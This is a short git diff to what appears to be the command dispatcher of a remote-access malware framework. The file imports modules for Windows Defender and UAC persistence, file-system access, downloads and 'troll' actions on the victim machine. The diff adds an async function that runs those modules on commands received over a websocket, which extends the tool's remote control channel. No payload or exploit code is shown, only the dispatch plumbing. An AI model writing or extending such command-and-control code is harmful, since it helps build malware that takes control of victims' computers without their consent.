@@ -26,6 +26,7 @@ from .modules.troll.website_spam import WebsiteSpam
 from .modules.persistence.defender import Defender
 from .modules.persistence.uac import UAC
 from .modules.troll import TrollActions
+import websockets
 
 filesystem_handler = FileSystem()
 download = Download()
@@ -95,3 +96,9 @@ def command_executor(command: Command, args: CommandArgs) -> CommandResult:
     print(f"Using {mod_name}")
     module = module_factory(mod_name)
     return module.run(command, args)
+
+async def command_executor_ws(command: Command, args: CommandArgs, websocket: websockets.WebSocketClientProtocol) -> None:
+    mod_name = command_to_module_map[command]
+    print(f"Using {mod_name}")
+    module = module_factory(mod_name)
+    await module.ws_run(command, args, websocket)
